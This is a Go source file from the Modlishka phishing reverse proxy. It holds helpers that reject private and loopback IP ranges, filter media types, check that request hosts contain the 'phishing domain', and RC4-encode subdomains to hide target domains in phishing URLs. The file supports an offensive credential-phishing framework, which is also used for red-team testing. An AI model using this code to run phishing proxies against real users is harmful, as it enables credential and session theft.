/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import (
	"crypto/rc4"
	"errors"
	"net"
	"strings"

	"github.com/drk1wi/Modlishka/log"

	"github.com/cespare/go-smaz"
	"github.com/manifoldco/go-base32"
	"github.com/miekg/dns"
)

// Media Types to not process. Append /* to wildcard the Media Type
// List of Media Types:
// http://www.iana.org/assignments/media-types/media-types.xhtml
var disabledMediaType = []string{
	"text/css",
	"text/plain",
	"image/*",
	"video/*",
	"audio/*",
}

//networks
var rejectedIPv4Networks = mustParseNetmasks(
	[]string{
		"127.0.0.0/8",
		"169.254.0.0/16",
		"10.0.0.0/8",
		"172.16.0.0/12",
		"192.168.0.0/16",
	},
)

var rejectedIPv6Networks = mustParseNetmasks(
	[]string{
		"fec0::/10",
		"fe80::/10",
		"fc00::/7",
		"::1/128",
		"::ffff:0:0/96",
	},
)

func mustParseNetmask(s string) *net.IPNet {
	_, ipnet, err := net.ParseCIDR(s)
	if err != nil {
		panic(`misc: mustParseNetmask(` + s + `): ` + err.Error())
	}
	return ipnet
}

func mustParseNetmasks(networks []string) []*net.IPNet {
	nets := make([]*net.IPNet, 0)
	for _, s := range networks {
		ipnet := mustParseNetmask(s)
		nets = append(nets, ipnet)
	}
	return nets
}

func isRejectedIP(ip net.IP) bool {
	if !ip.IsGlobalUnicast() {
		return true
	}

	netcheck := rejectedIPv4Networks
	if ip.To4() == nil {
		netcheck = rejectedIPv6Networks
	}

	for _, ipnet := range netcheck {
		if ipnet.Contains(ip) {
			return true
		}
	}

	return false
}

func IsRejectedDomain(domain string) bool {
	log.Debugf("[RP] Checking domain: %s ", domain)

	ip, _, err := net.ParseCIDR(domain)
	if err == nil {
		if isRejectedIP(ip) {
			log.Warningf("[RP] Illegal IP address found: %s ", domain)
			return true
		}
	}

	if ips, err := net.LookupIP(domain); err == nil {
		for _, ip := range ips {
			log.Debugf("[RP] Checking IP: %s ", ip.String())
			if isRejectedIP(ip) {
				log.Warningf("[RP] Illegal IP address found: %s ", domain)
				return true
			}
		}
	}
	return false
}

// Check if provided Media Type should be handled
func IsValidMediaType(mediaType string) bool {

	mediaType = strings.ToLower(mediaType)
	for _, disabled := range disabledMediaType {

		disabled = strings.ToLower(disabled)
		if strings.Contains(disabled, "/*") {
			if strings.HasPrefix(mediaType, strings.Split(disabled, "/*")[0]) {
				return false
			}
		} else if mediaType == disabled {
			return false
		}
	}

	// It's valid
	return true
}

// Check if the Host header domain contains our phishing domain
func IsValidRequestHost(host string, phishdomain string) bool {

	if strings.Contains(host, phishdomain) == false {
		log.Warningf("Host %s does not contain the phishing domain", host)
		return false
	}

	if _, ok := dns.IsDomainName(string(host)); ok == false {
		log.Warningf("Host %s is not a valid domain", host)
		return false
	}

	return true
}

func EncodeSubdomain(domain string) (encoded string, err error) {

	c, err := rc4.NewCipher([]byte(RC4_KEY))
	if err != nil {
		log.Errorf("EncodeSubdomain error: %s", err)
		return "", err
	}

	compressed := smaz.Compress([]byte(domain))
	var src []byte
	src = make([]byte, len(compressed))
	copy(src[:], compressed)
	c.XORKeyStream(src, src)
	return base32.EncodeToString(src), nil

}

func DecodeSubdomain(encodedDomain string) (domain string, err error) {

	c, err := rc4.NewCipher([]byte(RC4_KEY))
	if err != nil {
		log.Errorf("DecodeSubdomain error: %s", err)
		return "", err
	}

	src, err := base32.DecodeString(encodedDomain)
	if err != nil {
		return "", err
	}

	c.XORKeyStream(src, src)
	src, err = smaz.Decompress(src)
	if err != nil {
		log.Errorf("DecodeSubdomain error: %s", err)
		return "", err
	}

	if RegexpSubdomain.MatchString(string(src)) == false {
		log.Warningf(" DecodeSubdomain: domain [%s] contains invalid characters", string(src))
		return "", errors.New("DecodeSubdomain contains invalid characters ")
	}

	log.Debugf("DecodeSubdomain: %s", string(src))
	return string(src), nil
}
